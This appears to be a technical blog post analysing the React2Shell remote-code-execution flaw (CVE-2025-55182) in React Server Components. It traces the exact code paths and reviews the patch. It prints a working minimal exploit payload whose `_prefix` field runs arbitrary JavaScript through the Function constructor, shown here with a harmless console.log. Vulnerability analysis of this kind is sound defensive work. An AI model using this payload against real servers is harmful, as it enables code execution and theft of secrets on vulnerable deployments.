# React2Shell in details

Guillermo Rauch (Vercel's CEO) posted a
[very nice article](https://x.com/rauchg/status/1997362942929440937?s=20)
explaining the [React2Shell exploit (CVE-2025-55182)](https://react2shell.com/).

The bug was discovered by **Lachlan Davidson**. While you can see it's
easy to trigger why it happens is not trivial, so kudos to Lachlan for
his ingenious work to exploit it! 👏

But I wanted to know more about it, to understand exactly the code paths,
so I looked at the
[patch fixing it](https://github.com/facebook/react/commit/bbed0b0ee64b89353a40d6313037bbc80221bc3d.patch),
at the final
[v19.0.1 patched version](https://github.com/facebook/react/blob/v19.0.1/packages/react-server/src/ReactFlightReplyServer.js)
and the original (buggy) code
[v19.0.0](https://github.com/facebook/react/blob/v19.0.0/packages/react-server/src/ReactFlightReplyServer.js)
which I use as the base to explain the details below.

## Investigation: why the bug happens?

Let's start with the minimum viable exploit from
[@maple3142](https://x.com/@maple3142):

```js
{
  0: {
    status: "resolved_model",
    reason: 0,
    _response: {
      _prefix: "console.log('☠️')//",
      _formData: {
        get: "$1:then:constructor",
      },
    },
    then: "$1:then",
    value: '{"then":"$B"}',
  },
  1: "$@0",
}
```

This payload is handled by one of the React Server Components (RSC)
packages such as `react-server-dom-esm`, `react-server-dom-turbopack`
or `react-server-dom-webpack`. They handle the bus messages
from `decodeReplyFromBusboy()` which will add event listeners
that calls `resolveField()`
(imported from the same `react-server/src/ReactFlightServer`)
**asynchronously** (later, not immediately) and it ends returning
`getRoot(response)`, which is a simple wrapper on top of
`getChunk(response, 0)` that returns a `Promise`-like object.
See
[`decodeReplyFromBusboy()` from react-server-dom-esm](https://github.com/facebook/react/blob/v19.0.0/packages/react-server-dom-esm/src/server/ReactFlightDOMServerNode.js#L206)
for a concrete example.

Note that `getChunk(response, 0)` is called **BEFORE** any field events
were dispatched, so it just calls `createPendingChunk()` and the
`PendingChunk` is stored in
`response._chunks.set(0, chunk0)`.

The caller of `decodeReplyFromBusboy()` will get this `chunk0`
and will wait for this promise with
`chunk0.then(resolve, reject)`, that is
[implemented as `Chunk.prototype.then`](https://github.com/facebook/react/blob/v19.0.0/packages/react-server/src/ReactFlightReplyServer.js#L131),
to register the given `resolve` and `reject` callbacks in the
arrays `chunk.value` and `chunk.reason`, respectively.
(It's confusing, but React does overload the `value` and `reason` depending on the chunk `status`).

When the field events are later dispatched and they call the function
[`resolveField()`](https://github.com/facebook/react/blob/v19.0.0/packages/react-server/src/ReactFlightReplyServer.js#L1110),
in addition to `response._formData.append(key, value)` it will notice
that `response._chunks.get(0)` exits, then it will call
`resolveModelChunk()` on `chunk0`.

The function
[`resolveModelChunk()`](https://github.com/facebook/react/blob/v19.0.0/packages/react-server/src/ReactFlightReplyServer.js#L264),
will convert the `chunk0` from `PendingChunk` to `ResolvedModelChunk`.
It does this by first storing the arrays of listeners for resolve and reject
(`value` and `reason` respectively) in local variables (`resolveListeners` and `rejectListeners`),
then changing `status = 'resolved_model'`,
`value` (given to `resolveField()`) and `reason`
(before the patch it was the chunk `id`,
after patch fixing the exploit it is now an object with the id and the response --
at the end of this investigation you'll notice why this change was required).

Since we explained above that `chunk0.then(resolve)` registers the
`resolve` function in the `chunk.value` array (now `resolveListeners`),
inside `resolveModelChunk()` we have a non-null `resolveListeners`, then
it will call `initializeModelChunk()` followed by `wakeChunkIfInitialized()`.

The function
[`initializeModelChunk()`](https://github.com/facebook/react/blob/v19.0.0/packages/react-server/src/ReactFlightReplyServer.js#L444)
calls `JSON.parse(chunk.value)` (some people are pointing to it as the reason, but it's safe!)
to get `rawModel` and then
[`reviveModel()`](https://github.com/facebook/react/blob/v19.0.1/packages/react-server/src/ReactFlightReplyServer.js#L528)
on it. **There is where the problem starts**.

Let's recap what the server just did:

```js
// from the RSC field event handler
resolveField(response, '0', `{
  status: "resolved_model",
  reason: 0,
  _response: {
    _prefix: "console.log('☠️')//",
    _formData: {
      get: "$1:then:constructor",
    },
  },
  then: "$1:then",
  value: '{"then":"$B"}',
}`);

// resolveField calls:
resolveModelChunk(chunk, `{
  status: "resolved_model",
  reason: 0,
  _response: {
    _prefix: "console.log('☠️')//",
    _formData: {
      get: "$1:then:constructor",
    },
  },
  then: "$1:then",
  value: '{"then":"$B"}',
}`, 0);

// resolveModelChunk calls:
resolvedChunk.value = `{
  status: "resolved_model",
  reason: 0,
  _response: {
    _prefix: "console.log('☠️')//",
    _formData: {
      get: "$1:then:constructor",
    },
  },
  then: "$1:then",
  value: '{"then":"$B"}',
}`;
initializeModelChunk(resolvedChunk);

// initializeModelChunk calls:
const rawModel = JSON.parse(`{
  status: "resolved_model",
  reason: 0,
  _response: {
    _prefix: "console.log('☠️')//",
    _formData: {
      get: "$1:then:constructor",
    },
  },
  then: "$1:then",
  value: '{"then":"$B"}',
}`);
const value = reviveModel(
  chunk._response,
  {'': rawModel}, // parent object
  '', // parent key
  rawModel, // value: { status: 'resolved_model', ..., _response: ... }
  '0', // root reference
);

// reviveModel recursively revive every field:
if (typeof value === 'object' && value !== null) {
  // ...
  for (const key in value) { // value: { status: 'resolved_model', ..., _response: ... }
    // ...
    const newValue = reviveModel(/* ... */)
```

As seen above, inside the function
[`reviveModel`](https://github.com/facebook/react/blob/v19.0.0/packages/react-server/src/ReactFlightReplyServer.js#L384)
it will receive an object, in this case it will **recursively revive all fields**.

So at some point `_response._formData.get` will be revived,
since it's a string `"$1:then:constructor"`, it will call
[`parseModelString()`](https://github.com/facebook/react/blob/v19.0.0/packages/react-server/src/ReactFlightReplyServer.js#L908).

This function checks if the first character is `$` and it is,
but none of the other modifiers apply, so it goes straight to
[`getOutlinedModel()`](https://github.com/facebook/react/blob/v19.0.0/packages/react-server/src/ReactFlightReplyServer.js#L587)
where the remaining reference is split, returning:
`["1", "then", "constructor"]`, so it will access the chunk id `1`
by calling `getChunk(response, 1)`.

Since we called `getChunk(response, 1)` and it did not exist yet,
as seen before it will call `createPendingChunk()` and register
`response._chunks.set(0, chunk1)`. Since
`chunk` (here on called `chunk1`) is a `PendingChunk`
(`status` is `PENDING`), it will wait for the promise fulfillment with
`chunk1.then(createModelResolver(...))`. That is:
`chunk1.value` now contains an array with the result of
`createModelResolver()` using `chunk` as `chunk0`,
so once `1` resolves it will wake-up/continue the resolution of `0`.

This is the same for the field `then`, since it references `"$1:then"`.
The **same** `chunk1` is reused, it will just add the given
resolve listener to the `chunk1.value` array, which will
have 2 elements at this point.

Calling `createModelResolver()` will set `initializingChunkBlockedModel`,
which used by the caller (`initializeModelChunk()`) to convert the
chunk being resolved (`chunk0`) into `BlockedChunk`.

The `createModelResolver()` returns a resolver function
(to be later called by `Promise.then`).
Once the resolver function is called,
it will access the now-resolved `value` object using `path`
(ie: `["then", "constructor"]` will result in `value["then"]["constructor"]`),
then convert `chunk` (`chunk0`) from
`BlockedChunk` into `InitializedChunk` (fulfilled) and then
`wakeChunk()`, that will call all the listeners using `wakeChunk()`.

The listeners, at this point, are the two pending resolvers for fields
`_response._formData.get: "$1:then:constructor"` and `then: "$1:then"`.

The `initializeModelChunk()` for key `0` will end restoring the
**previous** `initializingChunkBlockedModel`, that was `null`.

As seen above for the root (`0`) key, once the field `1` is received
by `resolveField()`, it will call `resolveModelChunk()` which will
call `initializeModelChunk()` which calls `reviveModel()`.
Let's illustrate this:

```js
// from the RSC field event handler
resolveField(response, '1', `"$@0"`);

// resolveField calls:
resolveModelChunk(chunk, `"$@0"`, 1);

// resolveModelChunk calls:
resolvedChunk.value = `"$@0"`;
initializeModelChunk(resolvedChunk);

// initializeModelChunk calls:
const rawModel = JSON.parse(`"$@0"`);
const value = reviveModel(
  chunk._response,
  {'': rawModel}, // parent object
  '', // parent key
  rawModel, // value: "$@0"
  '1', // root reference
);

// reviveModel calls:
parseModelString(response, {'': rawModel}, '', '$@0', '1');

// parseModelString is:
if (value[0] === '$') {
  switch (value[1]) {
    // ...
    case '@': {
      // Promise
      const id = parseInt(value.slice(2), 16); // 0
      const chunk = getChunk(response, id); // chunk0
      return chunk;

// back to initializeModelChunk:
const value = chunk0; // not chunk0.value
if (
  initializingChunkBlockedModel !== null &&
  initializingChunkBlockedModel.deps > 0
) {
  // not this case
} else {
  const resolveListeners = cyclicChunk.value;
  const initializedChunk: InitializedChunk<T> = (chunk: any); // chunk1
  initializedChunk.status = INITIALIZED; // chunk1.status = INITIALIZED
  initializedChunk.value = value; // chunk1.value = chunk0, not chunk0.value
  if (resolveListeners !== null) { // we had 2 listeners for "$1:then:constructor" and "$1:then"
    wakeChunk(resolveListeners, value);
  }
}
```

Here `reviveModel()` will identify `value` is a string (`"$@0"`) and call
`parseModelString()` on it. It will parse this as a reference (`'$'`)
to a promise (`'@'`) pointing to `id: 0`. Then it will call
`getChunk(response, 0)`, which returns the first chunk (`chunk0`),
which is now in a blocked state (`BlockedChunk`).

Back to `initializeModelChunk()` execution for the field `1`,
`value` will be the `chunk0` (now `BlockedChunk`).

However `initializingChunkBlockedModel` wasn't set,
then `chunk1` considered `INITIALIZED` (fulfilled),
which converts the `chunk1` from `PendingChunk` into `InitializedChunk`,
with the value being a promise (`chunk0`).

Then it will `wakeChunk(resolveListeners, value)`, which will
go and call `listener(value)` for each listener in the array.

We had two listeners for `chunk1`, both created
with `createModelResolver()`, one is awaiting to resolve
`["1", "then", "constructor"]` and another to resolve `["1", "then"]`.
Once they are called they will change the value stored in key `0`,
effectively materializing the fields to their final values.
After all the 2 dependencies are called,
then `blocked.deps === 0` and it will
`wakeChunk()` the dependencies of `chunk0`.
Let's illustrate it:

```js
// the original initializeModelChunk() for key 0
const rawModel = JSON.parse(`{
  status: "resolved_model",
  reason: 0,
  _response: {
    _prefix: "console.log('☠️')//",
    _formData: {
      get: "$1:then:constructor",
    },
  },
  then: "$1:then",
  value: '{"then":"$B"}',
}`);
const value = reviveModel(
  chunk._response,
  {'': rawModel}, // parent object
  '', // parent key
  rawModel, // value: { status: 'resolved_model', ..., _response: ... }
  '0', // root reference
);

// after reviveModel(), value is:
const value = {
  status: "resolved_model",
  reason: 0,
  _response: {
    _prefix: "console.log('☠️')//",
    _formData: {
      get: Function, // see below
    },
  },
  then: chunk0.then, // points to the promise then method
  value: '{"then":"$B"}',
}
```

The field `_response._formData.get` is the result of calling
`chunk0['then']['constructor']`, which happens by
calling `createModelResolver()` with path `["1", "then", "constructor"]`:
```js
// createModelResolver, the returned model resolver function
for (let i = 1; i < path.length; i++) {
  value = value[path[i]];
}
```

A function constructor is always `Function` and whatever code you
give to it, it will evaluate that code once the returned function
handler is called. Using NodeJS REPL mode:

```js
> Promise.resolve(1).then.constructor
[Function: Function]
> const f = Promise.resolve(1).then.constructor("console.log('☠️')")
undefined
> f()
☠️
undefined
```

So whenever `_response._formData.get(code)` is called, it will
execute the `code`, which may do anything. In Guillermo's article
it's a harmless `console.log('☠️')`, but malicious users are using it
to steal secrets (ie: `process.env`) and even download and run
malware, including bitcoin miners, spam farms and so on.

**But how is it called with malicious code?**

Here comes the cyclical dependency of promises to trick React Flight
into using **the user object as an internal one: Chunk**.

We're in the `initializeModelChunk()` for key `0` (root), we now have
the `value` as per above, we convert `chunk0` to `InitializedChunk`
and we'll call all the pending `resolveListeners`, which is an array
with the listener added with `Chunk.prototype.then()` by the caller
of `decodeReplyFromBusboy()`. At this point, in the buggy version, we call
[`wakeChunk(resolveListeners, value)`](https://github.com/facebook/react/blob/v19.0.0/packages/react-server/src/ReactFlightReplyServer.js#L488).

Since `value` has a `then` function,
whenever calling `resolve(valueWithThenField)`, being `resolve` the
first callback function when you `new Promise((resolve, reject) => {})`,
due JavaScript's "duck typing", it will `await value` to chain the promises.
Await translates to the following:

```js
// `await value` becomes
return new Promise((resolve, reject) => {
  value.then.call(value, resolve, reject); // or .apply(), with this being `value`
});
```

You can validate this behavior using
[`Promise.resolve()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/resolve):

```js
function t(resolve, reject) {
  console.log('t:', this, resolve, reject);
  resolve(1);
}

// Notice `this` is { then: t, MyObjectMarker: 1 }
> await Promise.resolve({ then: t, MyObjectMarker: 42 })
t: { then: [Function: t], MyObjectMarker: 42 } [Function (anonymous)] [Function (anonymous)]
1
```

So we're calling `value.then`, as we saw that is `chunk0.then`, which is
`Chunk.prototype.then`.

Pay close attention to `this` being replaced with the given `value`,
effectively we're calling `Chunk.prototype.then` with `this` being
`chunk0.value`, **NOT** `chunk0` itself!
Note that the `chunk0.value` is in the same shape as a `ResolvedChunk`:

```js
{
  status: "resolved_model",
  reason: 0,
  _response: {
    _prefix: "console.log('☠️')//",
    _formData: {
      get: Function, // see below
    },
  },
  then: chunk0.then, // points to the promise then()
  value: '{"then":"$B"}',
}
```

Look into [`Chunk.prototype.then`](https://github.com/facebook/react/blob/v19.0.0/packages/react-server/src/ReactFlightReplyServer.js#L139):
it checks if `status` is `RESOLVED_MODEL` (`"resolved_model"`)
to call `initializeModelChunk()`, which will try to revive the model
value `'{"then":"$B"}'` using `chunk._response`, which is **user defined ⚠️**
and careful crafted so `_response._formData.get` is `Function`.
So all that is left is to call `_response._formData.get` with malicious
code. Let's illustrate that:

```js
// Chunk.prototype.then: this is chunk0.value:
switch (chunk.status) {
  case RESOLVED_MODEL:
    initializeModelChunk({
      status: "resolved_model",
      reason: 0,
      _response: {
        _prefix: "console.log('☠️')//",
        _formData: {
          get: Function, // see below
        },
      },
      then: chunk0.then, // points to the promise then()
      value: '{"then":"$B"}',
    });
    break;
}

// initializeModelChunk calls:
const rawModel = JSON.parse('{"then":"$B"}');

const value: T = reviveModel(
  chunk._response, // _formData.get is Function!
  {'': rawModel},
  '',
  rawModel, // { then: '$B' }
  rootReference,
);

// reviveModel() recursively calls, will go revive "$B"
parseModelString(
  chunk._response, // _formData.get is Function!
  ...,
  '$B',
);

// parseModelString() for '$B'
case 'B': {
  const id = parseInt(value.slice(2), 16); // NaN, "$B".slice(2) is ""
  const prefix = response._prefix; // "console.log('☠️')//"
  const blobKey = prefix + id; // "console.log('☠️')//NaN"
  const backingEntry: Blob = (response._formData.get(blobKey): any); // Function("console.log('☠️')//NaN")
  return backingEntry;
}

// back to initializeModelChunk() we end with revived value:
const value = { then: Function("console.log('☠️')//NaN") };
```

As one can see, the `id` is added after `prefix`, so we must end our
injected code (`_response._prefix`) with a comment (`//`) in order
to ignore it, or it would break with a `SyntaxError` exception.

As before, it's converted from `ResolvedModelChunk` to `InitializedChunk`
and `wakeChunk(resolveListeners, value)` with that value.

As we saw, whenever you return an object with a `then` function, it
will be called, effectively running the malicious code.

## Understanding the Fix

While the
[patch](https://github.com/facebook/react/commit/bbed0b0ee64b89353a40d6313037bbc80221bc3d.patch)
adds more robustness, it's core is to avoid an user object being
handled as an internal object.

It could have been simpler by just checking if
`this instanceof Chunk`, which would have mitigated using
`chunk.value` as `chunk`.
I think solving it in the `then` implementation
would be simpler than introducing an explicit loop in the newly added
`fulfillReference()` and inside `getOutlinedModel()`.

It also goes into removing `_response` from the chunk and moving it into
`reason`, which is more commonly reset over time (when chunks change state).
The response is stored in an object using a `Symbol()` key,
so it cannot be injected over the network
(unless you explicitly pass a `reviver` to `JSON.parse()` that converts some name to it).

Some safety was added before calling `resolve` or `reject`, since these
callbacks may be `undefined`. Some `try-catch` were added to properly
cleanup the `busboyStream`.
But these has nothing to do with this specific bug.

Some refactor was also done, removing `CyclicChunk` and using
`BlockedChunk` instead, cleaning up some code paths.
I did not stop to review in depth and see why (if) it was needed,
but I'd refrain from doing so much changes to fix a serious problem
as this one.

